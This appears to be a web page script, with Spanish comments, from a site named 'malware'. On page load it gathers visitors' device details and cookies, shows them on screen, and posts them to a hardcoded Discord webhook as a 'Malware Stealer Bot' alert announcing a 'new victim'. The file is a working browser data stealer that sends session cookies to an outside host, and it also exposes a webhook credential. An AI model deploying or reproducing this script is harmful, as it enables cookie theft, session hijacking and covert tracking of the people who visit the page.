document.addEventListener('DOMContentLoaded', () => {
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1499517425438294108/MG34oXvRkdltsXLHYPYdiSnJO1Cv9KlzD5VB3oAYsl9Ra4In9Bpnz1B65czCWesOCsrQ";

    // 1. Recolectar datos
    const data = {
        device: navigator.platform,
        browser: navigator.userAgent.split(' ')[0],
        screen: `${window.screen.width} x ${window.screen.height}`,
        network: (navigator.connection || {}).effectiveType || "Desconocida",
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Desconocido",
        lang: navigator.language,
        cookies: document.cookie || "Sin cookies"
    };

    // 2. Mostrar datos en la pantalla de la web
    document.getElementById('device').innerText = data.device;
    document.getElementById('browser').innerText = data.browser;
    document.getElementById('screen').innerText = data.screen;
    document.getElementById('network').innerText = data.network;
    document.getElementById('ram').innerText = data.ram;
    document.getElementById('lang').innerText = data.lang;
    document.getElementById('cookies').innerText = data.cookies;

    // 3. ENVIAR a Discord vía Webhook
    const discordPayload = {
        username: "Malware Stealer Bot",
        avatar_url: "https://i.imgur.com/AfFp7pu.png",
        embeds: [{
            title: "🚀 ¡Nueva Víctima ha entrado!",
            color: 52428, // Verde neón
            fields: [
                { name: "📱 Dispositivo", value: data.device, inline: true },
                { name: "🌐 Navegador", value: data.browser, inline: true },
                { name: "🖼️ Pantalla", value: data.screen, inline: true },
                { name: "📶 Red", value: data.network, inline: true },
                { name: "🧠 RAM", value: data.ram, inline: true },
                { name: "🌍 Idioma", value: data.lang, inline: true },
                { name: "🍪 Cookies", value: data.cookies, inline: false }
            ],
            footer: { text: "Enviado desde troog09.github.io/malware" },
            timestamp: new Date().toISOString()
        }]
    };

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(discordPayload)
    })
    .then(response => console.log("Datos enviados a Discord correctamente"))
    .catch(error => console.error("Error al enviar a Discord:", error));
});
